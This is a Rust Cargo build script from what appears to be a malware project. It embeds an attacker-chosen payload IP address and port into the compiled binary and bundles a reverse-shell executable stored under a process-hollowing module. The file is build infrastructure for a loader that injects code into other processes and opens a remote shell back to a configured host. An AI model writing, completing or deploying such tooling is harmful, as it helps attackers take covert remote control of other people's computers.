use std::env;
use std::fs;
use std::path::Path;
fn main() {
    dotenv_build::output(dotenv_build::Config::default()).unwrap();
    if let Ok(ip) = std::env::var("PAYLOAD_IP") {
        println!("cargo:rustc-env=PAYLOAD_IP={}", ip);
    }
    if let Ok(port) = std::env::var("PAYLOAD_PORT") {
        println!("cargo:rustc-env=PAYLOAD_PORT={}", port);
    }

    let payload_src = "src/process_hollowing/reverse_shell.exe";
    let out_dir = env::var("OUT_DIR").expect("OUT_DIR not set");
    let payload_dst = Path::new(&out_dir).join("reverse_shell.exe");

    fs::copy(payload_src, &payload_dst).expect("failed to copy reverse_shell.exe");

    println!("cargo:rerun-if-changed={}", payload_src);
}